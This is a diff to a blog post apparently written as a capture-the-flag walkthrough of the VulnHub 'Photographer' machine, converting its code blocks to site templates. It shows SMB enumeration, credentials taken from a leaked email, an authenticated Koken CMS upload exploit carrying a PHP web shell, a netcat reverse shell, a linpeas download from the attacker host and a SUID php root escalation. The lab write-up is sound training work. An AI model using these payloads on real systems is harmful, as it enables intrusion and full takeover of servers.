@@ -27,8 +27,7 @@ Giving Photographer from VulnHub.
 
 Run netdiscover to find the machine on the network.
 
-{% raw %}
-```sh
+{% capture netdiscover %}
  Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                            
                                                                                                                                                                                                                                           
  3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                                          
@@ -38,14 +37,13 @@ Run netdiscover to find the machine on the network.
  10.0.0.1        0a:00:27:00:00:1b      1      60  Unknown vendor                                                                                                                                                                         
  10.0.0.2        08:00:27:d2:7f:7f      1      60  PCS Systemtechnik GmbH                                                                                                                                                                 
  10.0.0.15       08:00:27:2f:84:a3      1      60  PCS Systemtechnik GmbH
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=netdiscover %}
 
 <br />
 Run nmap to determine the open ports and services.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.0.0.15    
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 15:39 AEDT
@@ -98,14 +96,13 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 28.89 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run nmap with the vuln script category.
 
-{% raw %}
-```sh
+{% capture vulnchk %}
 ┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
 └─$ cat vulnchk                    
 # Nmap 7.95 scan initiated Fri Jan 31 15:40:28 2025 as: /usr/lib/nmap/nmap --script vuln -oN vulnchk 10.0.0.15
@@ -122,14 +119,13 @@ Run nmap with the vuln script category.
 |_  /index/: Potentially interesting folder
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=vulnchk %}
 
 <br />
 List all of the shares on the SMB.
 
-{% raw %}
-```sh
+{% capture listsmb %}
 ┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
 └─$ smbclient -L //10.0.0.15/                 
 Password for [WORKGROUP\kali]:
@@ -147,14 +143,13 @@ Reconnecting with SMB1 for workgroup listing.
         Workgroup            Master
         ---------            -------
         WORKGROUP            PHOTOGRAPHER
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=listsmb %}
 
 <br />
 Connect to the sambashare share and list its contents.  Get a copy of the two files that are list in the share.
 
-{% raw %}
-```sh
+{% capture listsambashare %}
 ┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
 └─$ smbclient //10.0.0.15/sambashare
 Password for [WORKGROUP\kali]:
@@ -170,16 +165,18 @@ smb: \> get mailsent.txt
 getting file \mailsent.txt of size 503 as mailsent.txt (245.6 KiloBytes/sec) (average 245.6 KiloBytes/sec)
 smb: \> get wordpress.bkp.zip
 getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (160044.7 KiloBytes/sec) (average 156371.4 KiloBytes/sec)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=listsambashare %}
 
 <br />
 Check the contents of the mailsent.txt.  Note that there is a secret somewhere.  Neat.  There are also two names and two emails that should also be noted.
 
-{% raw %}
-```sh
+{% capture catmailsent %}
 ┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
 └─$ cat mailsent.txt 
+{% endcapture %}
+
+{% capture mailsent %}
 Message-ID: <4129F3CA.2020509@dc.edu>
 Date: Mon, 20 Jul 2020 11:40:36 -0400
 From: Agi Clarence <agi@photographer.com>
@@ -194,8 +191,11 @@ Content-Transfer-Encoding: 7bit
 Hi Daisa!
 Your site is ready now.
 Don't forget your secret, my babygirl ;)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catmailsent %}
+
+{% include codebox.html title="mailsent.txt" content=mailsent %}
 
 <br />
 Check the landing page on port 80.
@@ -209,10 +209,7 @@ Check the landing page on port 80.
 <br />
 Check the landing page source code on port 80.
 
-{% raw %}
-```sh
-view-source:http://10.0.0.15/
-
+{% capture landingpage %}
 <!DOCTYPE HTML>
 <!--
 	Photographer by v1n1v131r4
@@ -230,8 +227,8 @@ view-source:http://10.0.0.15/
 
     </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://10.0.0.15/' content=landingpage %}
 
 <br />
 Check the landing page on port 8000.  Notice the Koken CMS installation that is running on port 8000.
@@ -245,10 +242,7 @@ Check the landing page on port 8000.  Notice the Koken CMS installation that is 
 <br />
 Check the Exploit-DB for an exploit for the Koken installation.
 
-{% raw %}
-```sh
-https://www.exploit-db.com/exploits/48706
-
+{% capture exploitdb %}
 # Exploit Title: Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)
 # Date: 2020-07-15
 # Exploit Author: v1n1v131r4
@@ -325,8 +319,8 @@ Content-Type: image/jpeg
 
 
 5. On Koken CMS Library, select you file and put the mouse on "Download File" to see where your file is hosted on server.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='https://www.exploit-db.com/exploits/48706' content=exploitdb %}
 
 <br />
 Check the admin directory and view the login page.
@@ -340,8 +334,7 @@ Check the admin directory and view the login page.
 <br />
 curl -I http://10.0.0.15:8000 to see what information can be gleaned from the headers.
 
-{% raw %}
-```sh
+{% capture curlheaders %}
 ┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
 └─$ curl -I http://10.0.0.15:8000                                                                                                        
 HTTP/1.1 200 OK
@@ -349,14 +342,13 @@ Date: Fri, 31 Jan 2025 05:08:44 GMT
 Server: Apache/2.4.18 (Ubuntu)
 X-XHR-Current-Location: http://10.0.0.15:8000/
 Content-Type: text/html; charset=UTF-8
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curlheaders %}
 
 <br />
 Unzip the Wordpress zip file from the SMB.
 
-{% raw %}
-```sh
+{% capture unzipwordpress %}
 ┌──(kali㉿kali)-[~/Documents/vulnhub/photograph/wp]
 └─$ unzip ../wordpress.bkp.zip 
 Archive:  ../wordpress.bkp.zip
@@ -367,14 +359,13 @@ Archive:  ../wordpress.bkp.zip
   inflating: wordpress/wp-load.php   
 
   <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=unzipwordpress %}
 
 <br />
 Check the wp-config-sample.php for a potential password.
 
-{% raw %}
-```php
+{% capture configfile %}
 <?php
 /**
  * As configurações básicas do WordPress 
@@ -401,14 +392,13 @@ define( 'DB_CHARSET', 'utf8' );
 define( 'DB_COLLATE', '' );
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='php' title='wp_config.php' content=configfile %}
 
 <br />
 Ffuf the website on port 80.
 
-{% raw %}
-```sh
+{% capture ffuf80 %}
 ┌──(kali㉿kali)-[~/…/photograph/wp/wordpress/wp-content]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.0.15/FUZZ -e .txt,.bak,.html,.php -fs 5711
 
@@ -424,14 +414,13 @@ elements.html           [Status: 200, Size: 19831, Words: 1279, Lines: 459, Dura
 .php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 10ms]
 server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 8ms]
 :: Progress: [1102795/1102795] :: Job [1/1] :: 3225 req/sec :: Duration: [0:03:51] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf80 %}
 
 <br />
 Ffuf the website on port 8000.
 
-{% raw %}
-```sh
+{% capture ffuf8000 %}
 ┌──(kali㉿kali)-[~/…/photograph/wp/wordpress/wp-content]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.0.15:8000/FUZZ -e .txt,.bak,.html -fs 4708 -fw 1
 
@@ -447,8 +436,8 @@ http%3A.bak             [Status: 200, Size: 4683, Words: 207, Lines: 99, Duratio
 .html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 100ms]
 server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 38ms]
 :: Progress: [882236/882236] :: Job [1/1] :: 491 req/sec :: Duration: [0:32:33] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf8000 %}
 
 <br />
 Login using the daisa email and babygirl from the email body.  We had the "secret" all along.
@@ -462,11 +451,10 @@ Login using the daisa email and babygirl from the email body.  We had the "secre
 <br />
 Create image.php.jpg file that is indicated in the exploit.
 
-{% raw %}
-```php
+{% capture phponeliner %}
 <?php system($_GET['cmd']);?>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='php' title='php' content=phponeliner %}
 
 <br />
 Click on Import content in the lower right-hand corner.
@@ -498,8 +486,7 @@ Ensure that you intercept the request.
 <br />
 Upload the file.  Check that we caught the request.  Update the request to remove the .jpg extension from two different places in the request.
 
-{% raw %}
-```sh
+{% capture capturerequest %}
 POST /api.php?/content HTTP/1.1
 Host: 10.0.0.15:8000
 Content-Length: 928
@@ -549,8 +536,8 @@ Content-Type: image/jpeg
 <?php system($_GET['cmd']);?>
 
 ------WebKitFormBoundarydjT9BT6fKT3BUBDZ--
-```
-{% endraw %}
+{% endcapture %}
+{% include codebox.html title="Burp Request" content=capturerequest %}
 
 <br />
 Forward the request on to upload our malicious php file.
@@ -573,11 +560,10 @@ Watch the traffic that comes through the interceptor.  Note the location of our 
 <br />
 Test the path from the traffic with id for the cmd parameter to test command execution.
 
-{% raw %}
-```sh
-http://10.0.0.15:8000/storage/originals/7d/17/image.php?cmd=id
-```
-{% endraw %}
+<div class="info-box">
+  http://10.0.0.15:8000/storage/originals/7d/17/image.php?cmd=id
+</div>
+
 <div class="row justify-content-sm-center">
     <div class="col-sm-8 mt-3 mt-md-0">
         {% include figure.liquid loading="eager" path="/assets/img/photographer/id.png" title="Command Execution" class="img-fluid rounded z-depth-1" %}
@@ -587,23 +573,21 @@ http://10.0.0.15:8000/storage/originals/7d/17/image.php?cmd=id
 <br />
 Start a listener.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Use Revshells to generate a Python3 payload.
 
-{% raw %}
-```sh
-https://www.revshells.com/
-```
-{% endraw %}
+<div class="info-box">
+  https://www.revshells.com/
+</div>
+
 <div class="row justify-content-sm-center">
     <div class="col-sm mt-3 mt-md-0">
         {% include figure.liquid loading="eager" path="/assets/img/photographer/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
@@ -613,8 +597,7 @@ https://www.revshells.com/
 <br />
 Use the python3 payload from revshells and paste in into the cmd parameter.  Execute it.  Check the listener and catch the shell.
 
-{% raw %}
-```sh
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
@@ -623,14 +606,13 @@ connect to [10.0.0.14] from (UNKNOWN) [10.0.0.15] 41394
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@photographer:/var/www/html/koken/storage/originals/7d/17$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 cat user.txt
 <redacted>
 www-data@photographer:/home/daisa$ ip a
@@ -647,28 +629,26 @@ ip a
        valid_lft 589sec preferred_lft 589sec
     inet6 fe80::6c05:5fdd:681b:cd25/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Copy linpeas.sh into the local working folder and start a python web server to serve the script.
 
-{% raw %}
-```sh
+{% capture servepeas %}
 ┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
 └─$ cp `locate linpeas.sh` .                                                            
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Documents/vulnhub/photograph]
 └─$ python3 -m http.server               
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=t_bash %}
 
 <br />
 Transfer the results to the victim machine.
 
-{% raw %}
-```sh
+{% capture transferlinpeas %}
 www-data@photographer:/dev/shm$ wget 10.0.0.14:8000/linpeas.sh
 wget 10.0.0.14:8000/linpeas.sh
 --2025-01-31 07:22:25--  http://10.0.0.14:8000/linpeas.sh
@@ -682,15 +662,14 @@ linpeas.sh          100%[===================>] 820.08K  --.-KB/s    in 0.002s
 2025-01-31 07:22:25 (410 MB/s) - 'linpeas.sh' saved [839766/839766]
 
 www-data@photographer:/dev/shm$ chmod +x linpeas.sh
-chmod +x linpeas.shs
-```
-{% endraw %}
+chmod +x linpeas.sh
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferlinpeas %}
 
 <br />
 Run linpeas and review the results.  Notice that the php binary has the sticky bit.
 
-{% raw %}
-```sh
+{% capture linpeas %}
 www-data@photographer:/dev/shm$ ./linpeas.sh
 ./linpeas.sh
 
@@ -752,17 +731,16 @@ www-data@photographer:/dev/shm$ ./linpeas.sh
 -rwsr-xr-x 1 root root 40K May 16  2017 /bin/su
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=linpeas %}
 
 <br />
 Check the GTFOBins for a potential SUID privelege escalation.
 
-{% raw %}
-```sh
-https://gtfobins.github.io/gtfobins/php/
-```
-{% endraw %}
+<div class="info-box">
+  https://gtfobins.github.io/gtfobins/php/
+</div>
+
 <div class="row justify-content-sm-center">
     <div class="col-sm mt-3 mt-md-0">
         {% include figure.liquid loading="eager" path="/assets/img/photographer/gtfo.png" title="GTFOBins" class="img-fluid rounded z-depth-1" %}
@@ -772,21 +750,19 @@ https://gtfobins.github.io/gtfobins/php/
 <br />
 Use the php binary to escalate your privilege.
 
-{% raw %}
-```sh
+{% capture escalateprivilege %}
 www-data@photographer:/dev/shm$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
 <shm$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"                    
 # whoami
 whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=escalateprivilege %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 # cat proof.txt
 cat proof.txt
 
@@ -807,8 +783,8 @@ ip a
        valid_lft 585sec preferred_lft 585sec
     inet6 fe80::6c05:5fdd:681b:cd25/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And with that we finished up another one.
